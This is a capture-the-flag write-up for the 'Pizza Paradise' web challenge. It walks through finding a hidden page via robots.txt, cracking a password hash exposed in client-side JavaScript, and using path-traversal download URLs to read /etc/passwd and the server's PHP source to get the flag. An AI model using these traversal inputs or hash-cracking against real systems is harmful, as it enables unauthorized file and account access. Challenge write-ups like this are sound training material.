---
name: Pizza Paradise (2024)
event: Intigriti 1337UP LIVE CTF 2024
category: Web
description: Writeup for Pizza Paradise (Web) - 1337UP LIVE CTF (2024) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Pizza Paradise

## Video walkthrough

[![VIDEO](https://img.youtube.com/vi/qPxKyYrf9p4/0.jpg)](https://youtu.be/qPxKyYrf9p4 "Robots.txt, Hash Cracking and Path Traversal")

## Challenge Description

> Something weird going on at this pizza store!!

## Solution

Players arrive at an online pizza store (AI making some tasty looking pizzas these days 🤤).

![](./images/0.PNG)

There is appears to be nothing of interest, but `/robots.txt` has something.

{% code overflow="wrap" %}

```txt
User-agent: *
Disallow: /secret_172346606e1d24062e891d537e917a90.html
Disallow: /assets/
```

{% endcode %}

It's some kind of top secret login portal 🕵️‍♂️

![](./images/1.PNG)

Check the page source.

{% code overflow="wrap" %}

```js
function hashPassword(password) {
    return CryptoJS.SHA256(password).toString();
}

function validate() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    const credentials = getCredentials();
    const passwordHash = hashPassword(password);

    if (username === credentials.username && passwordHash === credentials.passwordHash) {
        return true;
    } else {
        alert("Invalid credentials!");
        return false;
    }
}
```

{% endcode %}

The `getCredentials()` function is in `/assets/js/auth.js`.

{% code overflow="wrap" %}

```js
const validUsername = "agent_1337";
const validPasswordHash = "91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac";

function getCredentials() {
    return {
        username: validUsername,
        passwordHash: validPasswordHash,
    };
}
```

{% endcode %}

Crack the SHA256 hash with `hashcat`, `john` or [crackstation](https://crackstation.net).

{% code overflow="wrap" %}

```txt
agent_1337:intel420
```

{% endcode %}

Now we get access to the portal and can download some secret images.

![](./images/2.PNG)

The download function makes a GET request.

{% code overflow="wrap" %}

```
https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/assets/images/topsecret1.png
```

{% endcode %}

Maybe we can try `/etc/passwd`

{% code overflow="wrap" %}

```
https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/etc/passwd
```

{% endcode %}

But we get an error: `File path not allowed!`

With some trial and error, it's clear that removing `/assets/images/` will cause problems. Let's try path traversal instead.

{% code overflow="wrap" %}

```
https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/assets/images/../../../../../etc/passwd
```

{% endcode %}

It works! We could try common locations for a `flag.txt` _or_ we could download the PHP source code of the web app 💡

{% code overflow="wrap" %}

```
https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/assets/images/../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php
```

{% endcode %}

Inside, we find the flag!

{% code overflow="wrap" %}

```php
$flag = 'INTIGRITI{70p_53cr37_m15510n_c0mpl373}';
```

{% endcode %}

Flag: `INTIGRITI{70p_53cr37_m15510n_c0mpl373}`
